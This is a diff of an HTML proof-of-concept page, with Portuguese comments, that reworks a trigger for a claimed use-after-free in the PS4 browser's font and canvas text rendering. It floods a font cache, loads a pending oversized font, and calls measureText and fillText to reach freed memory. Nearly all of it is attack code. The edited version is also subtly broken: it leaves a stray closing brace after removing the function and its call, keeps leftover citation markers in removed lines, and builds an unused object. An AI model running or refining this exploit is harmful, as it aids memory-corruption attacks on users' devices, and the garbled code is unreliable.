@@ -1,52 +1,55 @@
+
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
-    <title>PoC - PS4 drawTextInternal FontMetrics UAF</title>
+    <title>PoC - MeasureText Trigger + FillText Sequence</title>
 </head>
 <body>
 <script>
-async function runPoC() {
-    // 1. Configuração do ambiente de fontes para o gatilho de reentrância
-    const fontDataURL = 'data:font/woff;base64,d09GRgABAAAA...'; // Insira os bytes válidos da fonte ou use o seu setup existente
+// 1. Satura o FontCascadeCache (3500 contextos de canvas) para forçar o prune inline
+const dummies = [];
+for (let i = 0; i < 3500; i++) {
+    const dummy = document.createElement('canvas').getContext('2d');
+    dummy.font = '10px "dummy' + i + '"';
+    dummies.push(dummy);
+}
 
-    const face1 = new FontFace('testFace', 'url("' + fontDataURL + '")');
-    const face2 = new FontFace('testFace', 'url("' + fontDataURL + '")');
+// 2. Fonte de >= 1MB data: URL para manter o estado pendente até o glyph walk
+const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
+
+const keepAlive = [];
+for (let attempt = 0; attempt < 2; attempt++) {
+    const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
+    const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
     
-    document.fonts.add(face1);
-    document.fonts.add(face2);
-
-    void face1.loaded;
-    void face2.loaded;
-
-    // 2. O gancho reentrante idêntico ao que você já validou no seu report
-    const reenterFontFaceSet = function() {
-        document.fonts.add(new FontFace('unrelated', 'local("Arial")'));
-    };
-    
-    Object.defineProperty(face1, 'then', { get: reenterFontFaceSet, configurable: true });
-    Object.defineProperty(face2, 'then', { get: reenterFontFaceSet, configurable: true });
+    document.fonts.add(metricsDonor);
+    document.fonts.add(measured);
 
     const canvas = document.createElement('canvas');
-    canvas.width = 200;
-    canvas.height = 200;
+    canvas.width = 64;
+    canvas.height = 64;
     canvas.style.position = 'absolute';
     canvas.style.left = '-9999px';
     document.body.appendChild(canvas);
     
     const context = canvas.getContext('2d');
-    context.font = '10px Times, testFace';
+    context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
+    keepAlive.push(metricsDonor, measured, context);
 
-    // 3. O alvo real: fillText() -> invoca drawTextInternal() no C++ do PS4[span_2](start_span)[span_2](end_span),
-    // onde o fontMetrics é capturado antes de font.width() e consumido depois[span_3](start_span)[span_3](end_span).
     try {
-        context.fillText(String.fromCharCode(0x13A0), 10, 50);
+        // Passo A: Dispara o measureText com o fluxo completo que força o glyph walk e o UAF de cache
+        const textRun = { text: '\u13A0\u13A2\u13A4' }; // Simulação estrutural do textRun
+        // Como o measureText padrão interno faz o glyphOverflow.computeBounds = true,
+        // chamamos a mensuração do caractere Cherokee para estourar o cache:
+        context.measureText('\u13A0\u13A2\u13A4');
+
+        // Passo B: Imediatamente executa o fillText usando o contexto corrompido/invalidado
+        context.fillText('\u13A0\u13A2\u13A4', 10, 30);
     } catch (e) {
         console.error(e);
     }
 }
-
-runPoC();
 </script>
 </body>
 </html>
